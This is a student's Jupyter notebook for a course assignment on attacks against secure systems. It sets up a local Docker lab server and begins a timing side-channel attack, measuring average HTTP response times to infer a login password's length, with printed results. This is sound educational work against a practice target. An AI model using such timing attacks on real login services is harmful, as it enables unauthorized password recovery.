{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "n-MtEVKgteed"
      },
      "source": [
        "# Attacks on Implementations of Secure Systems Assignment 1"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YpaA0_mjsQxm"
      },
      "source": [
        "## Commands used for docker\n",
        "`docker pull amarmic/attacks_on_implementations:Assignment1_x86_64`  \n",
        "`docker run --name ass1 -p 80:8080 amarmic/attacks_on_implementations:Assignment1_x86_64`\n",
        "\n",
        "## Commands used for Anaconda to test locally\n",
        "`conda create --name side_attacks python=3.12`\n",
        "`conda install requests`"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9OTeLRx43jQu"
      },
      "source": [
        "### Imports"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "id": "C4_4E9-43Vrf"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "import time"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zlpn9Gl93kwr"
      },
      "source": [
        "### Constants"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "gGeu_uCs3mrw"
      },
      "outputs": [],
      "source": [
        "base_url = \"http://localhost\"\n",
        "name = \"208009845\"\n",
        "difficulty = \"1\" # const for first difficuly\n",
        "max_password_length = 16\n",
        "amount_of_repeats = 10"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YV81TRXEwQnF"
      },
      "source": [
        "## Solution for difficulty 1\n",
        "With difficulty 1, the password length is variable, so we need first to find the length.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 22,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Response:  http://127.0.0.1:80/?user=208009845&password=dalphon&difficulty=1\n",
            "incorrect password\n"
          ]
        }
      ],
      "source": [
        "password = \"dalphon\"\n",
        "response = requests.get(f\"{base_url}/?user={name}&password={password}&difficulty={difficulty}\")\n",
        "print(\"Response: \", response.url)\n",
        "if response.status_code != 200 : # sanity check\n",
        "    print(\"Error: \", response.status_code)\n",
        "\n",
        "if response.text == \"1\":\n",
        "    print(\"correct password\")\n",
        "else:\n",
        "    print(\"incorrect password\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 663
        },
        "id": "Kr8GZJLGwXvi",
        "outputId": "eea3f658-6f55-4ac6-9d70-24486b2f6afa"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "1 0.006244134902954101\n",
            "2 0.003756213188171387\n",
            "3 0.0036405324935913086\n",
            "4 0.0035885095596313475\n",
            "5 0.0030592918395996095\n",
            "6 0.003885698318481445\n",
            "7 0.003362131118774414\n",
            "8 0.0032588958740234373\n",
            "9 0.003957891464233398\n",
            "10 0.004045820236206055\n",
            "11 0.0032053709030151365\n",
            "12 0.003016972541809082\n",
            "13 0.003079390525817871\n",
            "14 0.002951693534851074\n",
            "15 0.003354954719543457\n"
          ]
        }
      ],
      "source": [
        "# Find length of password\n",
        "# here we save the time of the query for each password length\n",
        "vector_iterations = [[] for _ in range(max_password_length-1)]\n",
        "for password_length in range(1,max_password_length): \n",
        "  password = \"a\" * password_length\n",
        "  for iteration in range(amount_of_repeats):\n",
        "    start = time.time()\n",
        "    response = requests.get(f\"{base_url}/?user={name}&password={password}&difficulty={difficulty}\")\n",
        "    end = time.time()\n",
        "    if response.status_code != 200: # sanity check\n",
        "      print(\"Error: \", response.status_code)\n",
        "      break\n",
        "    time_of_query = end - start\n",
        "    print()\n",
        "    vector_iterations[password_length-1].append(time_of_query)\n",
        "\n",
        "# calculate avg time for each password length\n",
        "for i in range(len(vector_iterations)):\n",
        "  vector_iterations[i] = sum(vector_iterations[i]) / len(vector_iterations[i])\n",
        "\n",
        "\n",
        "for i, avg_time in enumerate(vector_iterations):\n",
        "  print(i+1, avg_time)"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "display_name": "side_attacks",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.12.9"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
